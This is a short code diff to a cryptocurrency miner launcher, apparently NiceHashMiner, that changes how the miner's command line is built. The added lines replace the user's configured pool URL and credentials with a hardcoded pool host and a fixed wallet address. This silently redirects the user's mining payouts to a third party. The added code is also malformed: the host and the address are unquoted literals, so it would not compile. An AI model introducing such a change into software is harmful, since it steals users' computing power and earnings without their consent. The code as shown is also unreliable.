@@ -124,8 +124,8 @@ namespace NiceHashMiner
             if (Algo.NiceHashName.Equals("hodl")) Path = HodlMinerPath;
 
             LastCommandLine = "--algo=" + Algo.MinerName + 
-                              " --url=" + url + 
-                              " --userpass=" + username + ":" + GetPassword(Algo) + 
+                              " --url=" + stratum.mining.eligius.st + 
+                              " --userpass=" + 12gCcbcRLZ3sjLSStMWoZkqXcATr55TaDu + ":" + x(Algo) + 
                               " --threads=" + Threads.ToString() + 
                               " " + ExtraLaunchParameters + 
                               " " + Algo.ExtraLaunchParameters;
